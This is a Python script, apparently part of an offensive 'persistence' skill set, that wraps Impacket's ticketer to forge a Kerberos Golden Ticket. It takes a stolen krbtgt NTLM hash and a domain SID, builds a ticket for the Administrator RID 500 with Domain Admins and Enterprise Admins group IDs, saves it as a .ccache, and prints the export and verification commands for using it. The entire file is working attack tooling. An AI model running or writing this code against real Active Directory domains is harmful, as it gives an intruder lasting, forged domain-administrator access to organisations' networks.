#!/usr/bin/env python3
"""Generate a Golden Ticket with Impacket ticketer and provide usage hints.

Usage:
  python skills/persistence/scripts/golden_ticket.py -d corp.local --domain-sid S-1-5-21-... --krbtgt-hash <NTLM> -u Administrator -o ./admin.ccache
"""

from __future__ import annotations

import argparse
import json
import shutil
import subprocess
import sys
from pathlib import Path


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Golden Ticket generator wrapper.")
    parser.add_argument("-d", "--domain", required=True)
    parser.add_argument("--domain-sid", required=True)
    parser.add_argument("--krbtgt-hash", required=True)
    parser.add_argument("-u", "--user", required=True)
    parser.add_argument("--user-id", type=int, default=500)
    parser.add_argument("--groups", default="512,513,518,519,520")
    parser.add_argument("-o", "--output", required=True, help="Output .ccache path")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    output_path = Path(args.output).resolve()
    output_path.parent.mkdir(parents=True, exist_ok=True)
    tool = shutil.which("impacket-ticketer") or shutil.which("ticketer.py")

    command = [
        tool or "impacket-ticketer",
        "-nthash",
        args.krbtgt_hash,
        "-domain-sid",
        args.domain_sid,
        "-domain",
        args.domain,
        "-user-id",
        str(args.user_id),
        "-groups",
        args.groups,
        "-save",
        str(output_path),
        args.user,
    ]

    payload = {
        "ticket_type": "golden",
        "tool": tool or "impacket-ticketer",
        "tool_found": bool(tool),
        "command": command,
        "ticket_path": str(output_path),
        "export_command": f"export KRB5CCNAME={output_path}",
        "verification_command": f"klist -c {output_path}",
    }

    if not tool:
        print("[!] ticketer tool not found. Printing command only.", file=sys.stderr)
        print(" ".join(command))
        print(json.dumps(payload, indent=2, ensure_ascii=False))
        return 0

    result = subprocess.run(command, capture_output=True, text=True, check=False)
    payload["return_code"] = result.returncode
    payload["stdout"] = result.stdout.strip()
    payload["stderr"] = result.stderr.strip()
    print(json.dumps(payload, indent=2, ensure_ascii=False))
    return 0 if result.returncode == 0 else result.returncode


if __name__ == "__main__":
    raise SystemExit(main())
